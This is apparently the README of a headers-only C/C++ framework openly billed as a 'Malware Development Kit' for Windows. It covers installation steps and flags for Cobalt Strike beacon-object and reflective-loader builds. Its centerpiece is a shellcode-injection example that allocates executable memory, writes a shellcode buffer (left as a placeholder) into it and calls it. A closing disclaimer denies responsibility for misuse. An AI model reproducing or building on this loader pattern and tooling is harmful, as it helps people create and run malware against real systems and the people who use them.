# Malware Development Kit

The battle-tested, headers-only, CRT-free and STL-free C/C++ framework for malware development on Windows.

## Limitations

The framework only supports x64 architectures and [Clang](https://clang.llvm.org/) as compiler.

## Documentation

The complete [Doxygen](https://www.doxygen.nl/index.html) documentation is available at [https://ky4meru.github.io/mdk](https://ky4meru.github.io/mdk).

## Installation

Fetch the framework.

```bash
git clone https://github.com/ky4meru/mdk
```

Then, in your source code, include the framework modules you want.
To use the entire framwork, include `Mdk.h` or `Mdk/All.h`.

```c
#include "Mdk/Module.h"
```

Finally, give the framework path as an include directory to your compiler.
Below is an example with Clang on Linux.

```bash
clang --target=x86_64-w64-mingw32 -I "/local/path/to/mdk" -c file.cpp -o file.o
```

# Example

Here is a simple shellcode injection method, using this framework.

```c
#define _MDK_VERBOSE

#include "Mdk.h"

char shellcode[] = { /* insert byte code here */ };

int main(int argc, char* argv[])
{
    LPVOID payload = NULL;

    if (!MdkVirtualAllocEx(MdkCurrentProcess(), payload, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))
    {
        MDK_LOG_ERROR("Failed to allocate memory");
    }

    if (!MdkWriteProcessMemory(MdkCurrentProcess(), payload, shellcode, sizeof(shellcode), NULL))
    {
        MDK_LOG_ERROR("Failed to write memory");
    }

    MDK_CALL_PROC(payload);

    MDK_LOG_SUCCESS("Successfully injected")

    return MDK_SUCCESS;
}
```

## Preprocessor

Preprocessing definitions **must** be defined before the framework is included.

| Definition | Behavior |
|---|---|
| `_MDK_BOF` | Enables the Cobalt Strike compatible `MDK_LOG_*` macros using `BeaconPrintf`. |
| `_MDK_DEBUG` | Enables the `MDK_LOG_DEBUG` macro in the source code of the framework for debug purpose. |
| `_MDK_PIC` | Enables the `MDK_TEXT_SEC` macro that put the framework functions in `.text$MDK` for PIC development (UDRL). |
| `_MDK_VERBOSE` | Enables others `MDK_LOG_*` macros for logging purpose. |

## License

> [!CAUTION]
> To anyone who gains access to this repository: I cannot be held responsible for what you do with this project.
> **Use it at your own risk!**

See [LICENSE.txt](https://github.com/ky4meru/mdk/LICENSE.txt) file.